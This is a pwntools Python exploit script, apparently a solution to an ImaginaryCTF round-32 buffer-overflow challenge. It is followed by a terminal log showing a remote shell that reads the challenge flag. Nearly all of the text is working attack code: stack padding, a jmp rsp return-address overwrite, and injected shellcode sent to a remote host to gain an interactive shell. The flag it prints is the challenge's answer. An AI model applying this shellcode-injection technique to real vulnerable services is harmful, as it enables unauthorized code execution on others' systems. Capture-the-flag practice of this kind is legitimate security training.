from pwn import *
#jmp_8 = b"\xEB\x06"
context.arch = 'amd64'
jmp_rsp = 0x000000000040118d
padding = b'a' * (0x20 + 8)
shellcode = asm(shellcraft.sh())
payload = padding + p64(jmp_rsp) + shellcode
r = remote('simplebufferoverflow.fly.dev', 5000)
r.sendline(payload)
r.interactive()
'''
user@linux:~/ctf/ctf-solutions/imaginaryctf/round-32$ python3 simple-buffer-overflow.py
[+] Opening connection to simplebufferoverflow.fly.dev on port 5000: Done
[*] Switching to interactive mode
Feed me: $ cat flag.txt
ictf{sometimes_51mpl3r_is_harder_48309}
$
'''

